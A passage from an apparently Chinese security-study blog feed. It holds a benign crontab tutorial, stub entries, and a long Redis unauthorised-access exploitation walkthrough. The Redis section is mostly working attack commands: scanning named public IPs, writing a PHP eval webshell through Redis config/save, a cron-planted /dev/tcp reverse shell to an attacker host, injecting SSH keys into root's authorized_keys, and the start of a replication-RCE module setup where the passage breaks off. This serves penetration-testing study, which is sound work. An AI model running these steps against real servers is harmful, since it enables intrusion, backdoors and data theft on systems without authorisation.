title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.hetianlab.com/expc.do?ce=2afbad05-7336-4e91-b3b1-a6d3d08f7054">实验:Docker未授权访问漏洞</a></li><li><a href="https://www.cnblogs.com/sevck/p/5501767.html">【转+自己研究】新姿势之Docker Remote API未授权访问漏洞分析和利用</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> 未授权访问漏洞 </tag>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>面试题2</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%982.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%A2%E8%AF%95+%E7%AC%94%E8%AF%95/%E9%9D%A2%E8%AF%95%E9%A2%982.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>e承接上文</p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 面试+笔试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Shell脚本学习</title>
      <link href="/%E7%9F%A5%E8%AF%86/Linux/Linux-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Linux/Linux-Shell%E8%84%9A%E6%9C%AC%E5%AD%A6%E4%B9%A0.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><p><a href="https://wangdoc.com/bash/index.html">Bash 脚本教程</a></p><p><a href="https://11pmsleep.github.io/%E7%9F%A5%E8%AF%86/Linux/Linux-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E5%8F%8A%E6%8A%80%E5%B7%A7.html">Linux 常用命令及技巧 | 晚上十一点睡觉 (11pmsleep.github.io)</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> 常用命令 </tag>
            
            <tag> 脚本编写 </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux-Crontab计划任务</title>
      <link href="/%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.html"/>
      <url>/%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>我们经常使用的是crontab命令是cron table的简写，它是cron的配置文件，也可以叫它作业列表</p><h1 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务开启</span></span><br><span class="line">service crond start</span><br><span class="line"><span class="comment">#编辑计划任务</span></span><br><span class="line">crontab  -e  -u  用户名</span><br><span class="line"><span class="comment">#查看计划任务</span></span><br><span class="line">crontab  -l  -u  用户名</span><br><span class="line"><span class="comment">#删除计划任务：</span></span><br><span class="line">crontab  -r  -u  用户名</span><br></pre></td></tr></table></figure><h1 id="相关文件"><a href="#相关文件" class="headerlink" title="相关文件"></a>相关文件</h1><blockquote><p>我们可以在以下文件夹内找到相关配置文件:</p><ul><li><p>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;用户名 </p><blockquote><p>#目录下存放的是每个用户包括root的crontab任务，每个任务以创建者的名字命名，如果你是root用户，那下面有个root文件，建议日常备份，避免误删除导致crontab 文件丢失；</p></blockquote></li><li><p>&#x2F;etc&#x2F;crontab 这个文件负责调度各种管理和维护任务。#cron服务配置文件</p></li><li><p>&#x2F;etc&#x2F;cron.d&#x2F; 这个目录用来存放任何要执行的crontab文件或脚本。</p></li><li><p>我们还可以把脚本放在&#x2F;etc&#x2F;cron.hourly、&#x2F;etc&#x2F;cron.daily、&#x2F;etc&#x2F;cron.weekly、&#x2F;etc&#x2F;cron.monthly目录中，让它每小时&#x2F;天&#x2F;星期、月执行一次。</p></li><li><p>cron服务的日志文件。默认情况下,crontab中执行的日志写在&#x2F;var&#x2F;log下,如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /var/log/cron*</span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="时间格式"><a href="#时间格式" class="headerlink" title="时间格式"></a>时间格式</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#时间格式如下：</span></span><br><span class="line">f1   f2  f3   f4   f5 program</span><br><span class="line">*    *    *    *    *</span><br><span class="line">-    -    -    -    -</span><br><span class="line">|    |    |    |    |</span><br><span class="line">|    |    |    |    +----- 星期中星期几 (0 - 6) (星期天 为0)</span><br><span class="line">|    |    |    +---------- 月份 (1 - 12) </span><br><span class="line">|    |    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="line">|    +-------------------- 小时 (0 - 23)</span><br><span class="line">+------------------------- 分钟 (0 - 59)</span><br><span class="line"><span class="comment">#解释：</span></span><br><span class="line"><span class="comment">#其中 f1 是表示分钟，f2 表示小时，f3 表示一个月份中的第几日，f4 表示月份，f5 表示一个星期中的第几天。program 表示要执行的程序。</span></span><br><span class="line"><span class="comment">#当 f1 为 * 时表示每分钟都要执行 program，f2 为 * 时表示每小时都要执行程序，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a-b 时表示从第 a 分钟到第 b 分钟这段时间内要执行，f2 为 a-b 时表示从第 a 到第 b 小时都要执行，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 */n 时表示每 n 分钟个时间间隔执行一次，f2 为 */n 表示每 n 小时个时间间隔执行一次，其馀类推</span></span><br><span class="line"><span class="comment">#当 f1 为 a, b, c,... 时表示第 a, b, c,... 分钟要执行，f2 为 a, b, c,... 时表示第 a, b, c...个小时要执行，其馀类推</span></span><br></pre></td></tr></table></figure><h1 id="细节"><a href="#细节" class="headerlink" title="细节"></a>细节</h1><blockquote><ul><li><strong>crond</strong> 命令每分钟会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</li></ul><blockquote><p><strong>注意：</strong>新创建的 cron 任务，不会马上执行，至少要过 2 分钟后才可以，当然你可以重启 cron 来马上执行。</p></blockquote><ul><li>linux 任务调度的工作主要分为以下两类：</li></ul><blockquote><p>1、系统执行的工作：系统周期性所要执行的工作，如备份系统数据、清理缓存</p><p>2、个人执行的工作：某个用户定期要做的工作，例如每隔 10 分钟检查邮件服务器是否有新信，这些工作可由每个用户自行设置</p></blockquote><ul><li><p>所有命令需要写成绝对路径形式，如: <strong>&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker</strong></p></li><li><p>使用者也可以将所有的计划任务设定先存放在文件中，用 crontab file 的方式来设定执行时间</p></li><li><p>在 shell 脚本开头使用以下代码,调用sh解析脚本：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"></span><br><span class="line">. /etc/profile</span><br><span class="line">. ~/.bash_profile</span><br></pre></td></tr></table></figure></li><li><p>在 <strong>&#x2F;etc&#x2F;crontab</strong> 中添加环境变量，在可执行命令之前添加命令 <strong>. &#x2F;etc&#x2F;profile;&#x2F;bin&#x2F;sh</strong>，使得环境变量生效，例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 03 * * * . /etc/profile;/bin/sh /var/www/runoob/test.sh</span><br></pre></td></tr></table></figure></li></ul></blockquote><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><ul><li>每一分钟执行一次 &#x2F;bin&#x2F;ls：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* * * * * /bin/ls</span><br></pre></td></tr></table></figure><ul><li>在 12 月内, 每天的早上 6 点到 12 点，每隔 3 个小时 0 分钟执行一次 &#x2F;usr&#x2F;bin&#x2F;backup：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 6-12/3 * 12 * /usr/bin/backup</span><br></pre></td></tr></table></figure><ul><li>周一到周五每天下午 5:00 寄一封信给 <a href="mailto:&#x61;&#108;&#101;&#120;&#64;&#100;&#x6f;&#109;&#x61;&#x69;&#x6e;&#46;&#x6e;&#x61;&#109;&#101;">&#x61;&#108;&#101;&#120;&#64;&#100;&#x6f;&#109;&#x61;&#x69;&#x6e;&#46;&#x6e;&#x61;&#109;&#101;</a>：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0 17 * * 1-5 mail -s &quot;hi&quot; alex@domain.name &lt; /tmp/maildata</span><br></pre></td></tr></table></figure><ul><li>每月每天的午夜 0 点 20 分, 2 点 20 分, 4 点 20 分….执行 echo “haha”：</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">20 0-23/2 * * * echo &quot;haha&quot;</span><br></pre></td></tr></table></figure><ul><li>下面再看看几个具体的例子：</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">0 */2 * * * /sbin/service httpd restart  <span class="comment">#意思是每两个小时重启一次apache </span></span><br><span class="line">50 7 * * * /sbin/service sshd start  <span class="comment">#意思是每天7：50开启ssh服务 </span></span><br><span class="line">50 22 * * * /sbin/service sshd stop  <span class="comment">#意思是每天22：50关闭ssh服务 </span></span><br><span class="line">0 0 1,15 * * fsck /home  <span class="comment">#每月1号和15号检查/home 磁盘 </span></span><br><span class="line">1 * * * * /home/bruce/backup  <span class="comment">#每小时的第一分执行 /home/bruce/backup这个文件 </span></span><br><span class="line">00 03 * * 1-5 find /home <span class="string">&quot;*.xxx&quot;</span> -mtime +4 -<span class="built_in">exec</span> <span class="built_in">rm</span> &#123;&#125; \;  <span class="comment">#每周一至周五3点钟，在目录/home中，查找文件名为*.xxx的文件，并删除4天前的文件。</span></span><br><span class="line">30 6 */10 * * <span class="built_in">ls</span>  <span class="comment">#意思是每月的1、11、21、31日是的6：30执行一次ls命令</span></span><br></pre></td></tr></table></figure><h1 id="refer"><a href="#refer" class="headerlink" title="refer"></a>refer</h1><blockquote><ul><li><a href="https://www.runoob.com/linux/linux-comm-crontab.html">Linux crontab 命令</a></li><li><a href="https://wangdoc.com/bash/startup.html">https://wangdoc.com/bash/startup.html</a></li><li><a href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">Linux Crontab 定时任务</a></li><li><a href="https://www.cnblogs.com/intval/p/5763929.html">Linux定时任务Crontab命令详解</a></li><li><a href="https://www.cnblogs.com/EasonJim/p/8308717.html">Linux下的&#x2F;etc&#x2F;crontab文件和crontab -e命令区别及Crontab命令详解（转）</a></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 知识 </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计划任务 </tag>
            
            <tag> Linux </tag>
            
            <tag> 常用命令 </tag>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x12 - redis未授权访问漏洞</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/WEB%E5%AE%89%E5%85%A8/%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E/0x12-redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h1><h2 id="未授权概述"><a href="#未授权概述" class="headerlink" title="未授权概述"></a>未授权概述</h2><p>未授权访问漏洞可以理解为需要安全配置或权限认证的地址、授权页面配置不当导致其他用户可以无需认证授权直接访问从而引发重要权限可被操作、数据库或网站目录等敏感信息泄露。</p><h2 id="常见未授权访问漏洞"><a href="#常见未授权访问漏洞" class="headerlink" title="常见未授权访问漏洞"></a>常见未授权访问漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Redis 未授权访问漏洞</span><br><span class="line">Docker 未授权访问漏洞</span><br><span class="line">MongoDB 未授权访问漏洞</span><br><span class="line">Jenkins 未授权访问漏洞</span><br><span class="line">Memcached 未授权访问漏洞</span><br><span class="line">JBOSS 未授权访问漏洞</span><br><span class="line">VNC 未授权访问漏洞</span><br><span class="line">ZooKeeper 未授权访问漏洞</span><br><span class="line">Rsync 未授权访问漏洞</span><br><span class="line">Atlassian Crowd 未授权访问漏洞</span><br><span class="line">CouchDB 未授权访问漏洞</span><br><span class="line">Elasticsearch 未授权访问漏洞</span><br><span class="line">Hadoop 未授权访问漏洞</span><br><span class="line">Jupyter Notebook 未授权访问漏洞</span><br></pre></td></tr></table></figure><h1 id="Redis未授权访问"><a href="#Redis未授权访问" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h1><blockquote><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据。Redis 默认情况下，会绑定在 0.0.0.0:6379，，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。</p><p><strong>危害</strong>：</p><ol><li>导致敏感信息泄露</li><li>执行 flushall 可清空所有数据</li><li>通过数据备份功能（save）往磁盘写入后门文件（webshell、定时任务、ssh公钥），通过键值对方式</li></ol><blockquote><p>注：Windows上可以干：写webshell、写开机启动项、Windows2003写入MOF</p></blockquote></blockquote><h2 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h2><blockquote><p><a href="https://www.redis.com.cn/redis-intro.html">Redis 简介</a></p></blockquote><p><strong>Redis 是完全开源免费的，一个灵活的高性能 key-value 数据结构存储，可以用来作为数据库、缓存和消息队列。</strong></p><p>Redis是用C语言开发的一个开源的高性能键值对（key-value）数据库，和Memcached类似。Redis支持存储的value类型相对更多，包括string(字符串)、list(链表)、set(集合)、zset(sorted set有序集合)和hash（哈希类型）。这些数据类型都支持push&#x2F;pop、add&#x2F;remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，Redis支持各种不同方式的排序。与Memcached一样，为了保证效率，数据都是缓存在内存中。区别的是Redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。</p><p>Redis也是一个高性能的key-value数据库。Redis的出现，很大程度补偿了Memcached这类key&#x2F;value存储的不足，在部分场合可以对关系数据库起到很好的补充作用。它提供了Java，C&#x2F;C++，C#，PHP，JavaScript，Perl，Object-C，Python，Ruby，Erlang等客户端，使用很方便。</p><p>Redis支持主从同步。数据可以从主服务器向任意数量的从服务器上同步，从服务器可以是关联其他从服务器的主服务器。这使得Redis可执行单层树复 制。存盘可以有意无意的对数据进行写操作。由于完全实现了发布&#x2F;订阅机制，使得从数据库在任何地方同步树时，可订阅一个频道并接收主服务器完整的消息发布记录。同步对读取操作的可扩展性和数据冗余很有帮助。</p><h3 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a>应用场景</h3><blockquote><p>Redis 主要有两个应用场景：</p><ol><li>存储 缓存 用的数据；</li><li>需要高速读&#x2F;写的场合使用它快速读&#x2F;写；</li></ol></blockquote><h3 id="Redis-架构"><a href="#Redis-架构" class="headerlink" title="Redis 架构"></a>Redis 架构</h3><blockquote><p>Redis 主要由有两个程序组成：</p><p>Redis 客户端 redis-cli</p><p>Redis 服务器 redis-server</p><p>客户端、服务器可以位于同一台计算机或两台不同的计算机中。</p></blockquote><h3 id="什么是Redis主复制原理"><a href="#什么是Redis主复制原理" class="headerlink" title="什么是Redis主复制原理"></a>什么是Redis主复制原理</h3><p>如果把数据存储在单个Redis的实例中，当读写数据量比较大的时候，服务端就很难承受。为了应对这种情 况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中 主机和从机数据相同，而从机只负责读，主机只负责写（向主机写，从从机读，读写分离），通过读写分离可以大幅度减轻流量的压力，算是一 种通过牺牲空间来换取效率的缓解方式。</p><blockquote><p><a href="https://www.bilibili.com/video/BV19i4y1A7wz/?spm_id_from=333.788.recommend_more_video.-1">主从之间有通信，主机的更改要同步到从机</a></p></blockquote><blockquote><ol><li>分布式的服务器，主机宕机还会有从机备份，主机有修改要同步到从机，可以防止数据丢失</li></ol><blockquote><ul><li><p>增量复制</p></li><li><p>全量复制</p></li></ul></blockquote><ol start="2"><li><p>优点不止于此，还可以有读写分离</p></li><li><p>可用性拓展性有所提高</p></li></ol></blockquote><h3 id="Redis常用命令"><a href="#Redis常用命令" class="headerlink" title="Redis常用命令"></a>Redis常用命令</h3><blockquote><p><a href="https://www.cnblogs.com/cxxjohnson/p/9072383.html">redis常用命令大全</a></p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">redis连接远程服务器:</span></span><br><span class="line">redis-cli -h host -p port -a password</span><br><span class="line">set testkey &quot;Hello World&quot;          # 设置键testkey的值为字符串</span><br><span class="line">get testkey                        # 获取键testkey的内容</span><br><span class="line">set score 99                       # 设置键score的值为99</span><br><span class="line">incr score                         # 使用INCR命令将score的值增加1</span><br><span class="line">get score                          # 获取键score的内容</span><br><span class="line">keys *                             # 列出当前数据库中所有的键</span><br><span class="line">get anotherkey                     # 获取一个不存在的键的值</span><br><span class="line"> </span><br><span class="line">config set dir /home/test          # 设置工作目录</span><br><span class="line">config set dbfilename redis.rdb    # 设置备份文件名</span><br><span class="line">config get dir                     # 检查工作目录是否设置成功</span><br><span class="line">config get dbfilename              # 检查备份文件名是否设置成功</span><br><span class="line">save                               # 进行一次备份操作,将所有键值对保存到工作目录下备份文件里！！！</span><br><span class="line">flushall                           # 删除所有数据</span><br><span class="line">del key                            # 删除键为key的数据</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ping                               #检测是否连通且有权限执行命令</span><br><span class="line">info                               #查看redis配置信息</span><br><span class="line">slaveof                            # slaveof&lt;vpsIP&gt;PORT 设置主从关系</span><br></pre></td></tr></table></figure><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="常见端口"><a href="#常见端口" class="headerlink" title="常见端口"></a>常见端口</h3><blockquote><p>Redis 服务默认监听在6379端口上</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MongoDB：27017</span><br><span class="line">Memcached：11211 </span><br><span class="line">Jboss：8080</span><br><span class="line">VNC：5900、5901</span><br><span class="line">Docker：2375</span><br></pre></td></tr></table></figure><h3 id="端口探测查找漏洞"><a href="#端口探测查找漏洞" class="headerlink" title="端口探测查找漏洞"></a>端口探测查找漏洞</h3><blockquote><p>进行信息收集，寻找可能利用的点<br>通过nmap进行端口扫描，发现端口开放：</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -v -Pn -p 6379 -sV 124.223.217.243</span><br><span class="line">-v：显示过程</span><br><span class="line">-Pn：no ping</span><br><span class="line">-sV：版本探测</span><br><span class="line">124.223.217.243:6379我的VPS</span><br><span class="line"></span><br><span class="line">nmap -sV -p- -T4 47.104.255.11</span><br></pre></td></tr></table></figure><p>若是探测到6379端口，则下载客户端去尝试连接服务端</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">redis-cli -h 47.104.255.11 -p 6379</span><br></pre></td></tr></table></figure><p>连接后使用AUTH或者info检验回显，检查是否有未授权漏洞</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209242114906.png" alt="image-20220924211422658" style="zoom: 50%;" /><blockquote><p>那么如何批量检测呢？</p></blockquote><h2 id="Redis历史漏洞"><a href="#Redis历史漏洞" class="headerlink" title="Redis历史漏洞"></a>Redis历史漏洞</h2><h3 id="Redis未授权访问-1"><a href="#Redis未授权访问-1" class="headerlink" title="Redis未授权访问"></a>Redis未授权访问</h3><blockquote><p>因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据。</p><ol><li>导致敏感信息泄露</li><li>执行 flushall 可清空所有数据</li><li>通过数据备份功能（save）往磁盘写入后门文件（webshell、定时任务），通过键值对方式</li><li>如果Redis以root身份运行，可以给root账户写入SSH公钥文件，免密码登录</li></ol></blockquote><h3 id="Redis主从复制RCE"><a href="#Redis主从复制RCE" class="headerlink" title="Redis主从复制RCE"></a>Redis主从复制RCE</h3><blockquote><p>在 Reids 4.x 之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过c语言编译并加载恶意.so文件，达到代码执行的目的</p></blockquote><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#服务端 redis-server</span></span><br><span class="line">docker pull medicean/vulapps:r_redis_1</span><br><span class="line">docker run -dit -p 6379:6379 -p 2222:22 medicean/vulapps:r_redis_1</span><br><span class="line"></span><br><span class="line"><span class="comment">#安装 redis-cli  客户端</span></span><br><span class="line"><span class="comment">#1. 包管理器安装</span></span><br><span class="line">apt install redis-tools</span><br><span class="line"><span class="comment">#2. 源码安装</span></span><br><span class="line">wget http://download.redis.io/releases/redis-6.0.3.tar.gz</span><br><span class="line">tar -zxvf redis-6.0.3.tar.gz    <span class="comment">#解压</span></span><br><span class="line"><span class="built_in">cd</span> redis-6.0.3/</span><br><span class="line">make   <span class="comment">#编译</span></span><br><span class="line"><span class="built_in">cd</span> src/</span><br><span class="line"><span class="built_in">cp</span> redis-cli /usr/bin   <span class="comment">#客户端连接程序添加到bin中，可以命令行直接调用</span></span><br></pre></td></tr></table></figure><h3 id="漏洞利用方法-三种总览）"><a href="#漏洞利用方法-三种总览）" class="headerlink" title="漏洞利用方法(三种总览）"></a>漏洞利用方法(三种总览）</h3><blockquote><ol><li><p>通过redis数据备份功能结合WEB服务，往WEB网站根目录写入一句话木马，从而得到WEB网站权限</p></li><li><p>通过redis数据备份功能写定时任务，通过定时任务反弹Shell</p></li><li><p>通过redis数据备份功能写SSH公钥，实现免密登录linux服务器(需要root权限)</p></li></ol></blockquote><h4 id="第一种利用：写webshell"><a href="#第一种利用：写webshell" class="headerlink" title="第一种利用：写webshell"></a>第一种利用：写webshell</h4><h5 id="利用条件-x2F-前提"><a href="#利用条件-x2F-前提" class="headerlink" title="利用条件&#x2F;前提"></a>利用条件&#x2F;前提</h5><blockquote><ol><li>知道网站根目录绝对路径</li><li>对目标网站根目录有写入权限</li></ol></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">redis-cli -h 10.1.1.200 -p 6379</span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">&quot;&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;&quot;</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p>注意：设置键值为一句话木马时，可以使用如下形式：</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> x<span class="string">&quot;\r\n\r\n&lt;?php @eval(<span class="variable">$_POST</span>[&#x27;cmd&#x27;]);?&gt;\r\n\r\n&quot;</span></span><br></pre></td></tr></table></figure><p>解释：”\r\n\r\n” 表示换行，用Redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p></blockquote><h4 id="第二种利用：写定时任务反弹shell"><a href="#第二种利用：写定时任务反弹shell" class="headerlink" title="第二种利用：写定时任务反弹shell"></a>第二种利用：写定时任务反弹shell</h4><blockquote><p>关于定时任务crontab，之前写过一篇文章:<a href="https://11pmsleep.github.io/2022-09-24-%E7%9F%A5%E8%AF%86/Linux/Linux-Crontab%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1/">Linux-Crontab 计划任务</a></p></blockquote><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#10.1.1.200是被控端,也就是服务端</span></span><br><span class="line"><span class="comment">#10.1.1.100是攻击者</span></span><br><span class="line">redis-cli -h 10.1.1.200 -p 6379</span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; </span></span><br><span class="line"><span class="string">/dev/tcp/10.1.1.100/4433 0&gt;&amp;1\n\n&quot;</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br>关于<code>\n\n*/1 * * * * /bin/bash -i&gt;&amp; /dev/tcp/10.1.1.100/4433 0&gt;&amp;1\n\n</code><br>\n是换行，*&#x2F;1 * * * <em>是定时任务，因为要写定时任务，所以需要单独一行，使用\n<br>在</em>&#x2F;1 * * * <em>里面，</em>&#x2F;1表示每个一分钟就去执行一遍下面的任务<br><code>/bin/bash -i &gt;&amp; /dev/tcp/10.1.1.100/4433 0&gt;&amp;1</code>        #就是反弹shell的命令</p></blockquote><h4 id="第三种利用：写SSH公钥"><a href="#第三种利用：写SSH公钥" class="headerlink" title="第三种利用：写SSH公钥"></a>第三种利用：写SSH公钥</h4><blockquote><p>（redis需要有root权限）前提是redis具有root权限，这样才可以将公钥写入&#x2F;root&#x2F;.ssh 文件夹的authotrized_keys文件中。</p><p><strong>注意：</strong>关于写公钥登录是获得完整shell的方法，而且不像写脚本getshell那样会被检测出来</p></blockquote><h5 id="关于ssh密钥登陆"><a href="#关于ssh密钥登陆" class="headerlink" title="关于ssh密钥登陆"></a>关于ssh密钥登陆</h5><blockquote><p>root&#x2F;.ssh&#x2F;authorized_keys下面存放的就是所有公钥，有公钥即可无密码登录</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">默认情况下，生成的SSH密钥在用户家目录的 .ssh 目录下</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</span><br><span class="line">cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set m</span><br><span class="line">redis-cli -h 192.168.1.100 -p 6379</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename &quot;authorized_keys&quot;</span><br><span class="line">save</span><br><span class="line">ssh root@139.9.198.30 -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure><blockquote><p>说明：<br><code>(echo -e &quot;\n\n&quot;; cat ~/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; /tmp/foo.txt</code></p><blockquote><p><code>echo -e &quot;\n\n&quot;</code>里面，-e选项时，若字符串中转义字符，则特别加以处理，而不会将它当成一般文字输出<br>即表示此时输出两个回车换行<br>再在屏幕上cat ~&#x2F;.ssh&#x2F;id_rsa.pub，再加两个换行<br>最后将文件写入&#x2F;tmp&#x2F;foo.txt文件</p></blockquote><p><code>cat /tmp/foo.txt | redis-cli -h 192.168.1.100 -p 6379 -x set m</code></p><blockquote><p>就是将键值m设置为foo.txt里面内容</p></blockquote></blockquote><h3 id="主从复制RCE（前面有介绍主从复制）"><a href="#主从复制RCE（前面有介绍主从复制）" class="headerlink" title="主从复制RCE（前面有介绍主从复制）"></a>主从复制RCE（前面有介绍主从复制）</h3><p>主从复制实验可以使用老师的这个环境124.71.45.28</p><blockquote><p>nmap扫出结果：发现高于4.x版本，故有主从复制rce漏洞</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">6379/tcp open  redis   Redis key-value store 5.0.5</span><br></pre></td></tr></table></figure><p>在 Reids 4.x 之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写C语言并编译出 .so 文件。所以，我们可以</p><ol><li>手动编译 so 扩展文件（类似Windows的ddl）（不需要知道怎么写）</li></ol><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#编译生成so扩展文件</span></span><br><span class="line"><span class="built_in">cd</span> /root/</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/puckiestyle/RedisModules-ExecuteCommand</span><br><span class="line"><span 